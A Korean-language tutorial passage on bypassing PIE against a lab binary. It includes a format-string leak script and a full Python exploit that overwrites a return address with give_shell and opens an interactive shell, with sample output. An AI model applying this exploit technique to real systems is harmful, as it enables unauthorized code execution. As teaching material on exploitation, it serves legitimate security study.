Bypassing PIE :
    example8_leak.py는 give_shell 함수의 주소를 구하는 파이썬 스크립트는 다음과 같습니다.
    ex)
        #!/usr/bin/python
        '''
        example8_leak.py
        '''
        import struct
        import subprocess
        import os
        import pty
        def readline(fd):
        res = ''
        try:
            while True:
            ch = os.read(fd, 1)
            res += ch
            if ch == '\n':
                return res
        except:
            raise
        def read(fd, n):
        return os.read(fd, n)
        def writeline(proc, data):
        try:
            proc.stdin.write(data + '\n')
            proc.stdin.flush()
        except:
            raise
        def write(proc, data):
        try:
            proc.stdin.write(data)
            proc.stdin.flush()
        except:
            raise
        def p32(val):
        return struct.pack("<I", val)
        def u32(data):
        return struct.unpack("<I", data)[0]
        out_r, out_w = pty.openpty()
        s = subprocess.Popen("./example8", stdin=subprocess.PIPE, stdout=out_w)
        print read(out_r, 10) 
        writeline(s, "%x_"*11)
        fsb_data = readline(out_r)
        datas = fsb_data.split("_")
        code_addr = int(datas[10], 16)            # get 11th %x output
        print "vuln_ret_addr @ " + hex(code_addr)
        give_shell = code_addr - 0xee
        print "give_shell @ " + hex(give_shell)

    스크립트를 실행하면 다음과 같이 give_shell 함수의 주소가 출력됩니다.
    ex)
        $ python example8_leak.py
        Input1 > 
        vuln_ret_addr @ 0x565b67be
        give_shell @ 0x565b66d0

    마지막으로 example8.c의 18번째 줄에 존재하는 스택 오버플로우 취약점을 이용해
    vuln 함수의 리턴 주소를 give_shell 주소로 덮어 셸을 실행해 보도록 하겠습니다.

    buf로부터 리턴 주소까지의 오프셋은 40 바이트이므로 최종 공격 페이로드는 아래와 같이 구성됩니다.
    ex)
        "A" * 40 + give_shell

    example8.py는 example8에 대한 익스플로잇 코드입니다.
    ex)
        #!/usr/bin/python
        '''
        example8.py
        '''
        import struct
        import subprocess
        import os
        import pty
        import sys
        def readline(fd):
        res = ''
        try:
            while True:
            ch = os.read(fd, 1)
            res += ch
            if ch == '\n':
                return res
        except:
            raise
        def read(fd, n):
        return os.read(fd, n)
        def writeline(proc, data):
        try:
            proc.stdin.write(data + '\n')
            proc.stdin.flush()
        except:
            raise
        def write(proc, data):
        try:
            proc.stdin.write(data)
            proc.stdin.flush()
        except:
            raise
        def p32(val):
        return struct.pack("<I", val)
        def u32(data):
        return struct.unpack("<I", data)[0]
        out_r, out_w = pty.openpty()
        s = subprocess.Popen("./example8", stdin=subprocess.PIPE, stdout=out_w)
        print read(out_r, 10) 
        write(s, "%x_"*11+"\n\x00")
        fsb_data = readline(out_r)
        datas = fsb_data.split("_")
        code_addr = int(datas[10], 16)            # get 11th %x output
        print "vuln_ret_addr @ " + hex(code_addr)
        give_shell = code_addr - 0xee
        print "give_shell @ " + hex(give_shell)
        read(out_r, 1024)
        payload  = "A"*40
        payload += p32(give_shell)
        write(s, payload)
        print "[+] get shell"
        while True:
        cmd = raw_input("$ ")
        writeline(s, cmd)
        res = read(out_r, 102400)
        sys.stdout.write(res+'\n')

    example8.py를 실행한 결과 다음과 같이 셸이 획득되는 것을 확인할 수 있습니다.
    ex)
        $ python example8.py
        Input1 > 
        vuln_ret_addr @ 0x565eb7be
        give_shell @ 0x565eb6d0
        [+] get shell
        $ id
        uid=1001(theori) gid=1001(theori) groups=1001(theori)
        $ 
















